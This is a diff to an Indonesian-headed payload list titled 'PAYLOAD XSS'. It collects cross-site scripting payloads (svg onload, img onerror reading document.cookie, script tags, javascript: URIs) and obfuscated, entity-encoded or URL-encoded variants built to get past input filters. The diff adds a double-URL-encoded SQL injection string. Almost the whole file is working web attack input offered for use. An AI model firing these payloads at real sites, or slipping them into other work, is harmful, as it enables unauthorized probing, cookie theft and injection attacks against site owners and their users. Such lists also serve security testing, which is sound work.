@@ -2,6 +2,7 @@ PAYLOAD XSS
 PAYLOAD INI DIDAPATKAN DARI BERBAGAI SUMBER YANG DITEMUKAN OLEH PENULIS
 -----------------------------------------------------------------------
  
+
  javascri%0Dpt:alert/**/(1)
  <svg onload=alert(document.domain)>
 abc"><svg+onload=confirm(document.domain)>
@@ -9,6 +10,7 @@ abc"><svg+onload=confirm(document.domain)>
 <script>alert(1)</script>
 <script>alert("xss bug input search by zhirobyte")</script>
 "><img src=x onerror=prompt(document.cookie)>
+1%27/**/%256fR/**/50%2521%253D22%253B%2523
 
 <svg onload=prompt%26%230000000040document.domain)>
 <svg onload=prompt%26%23x000000028;document.domain)>
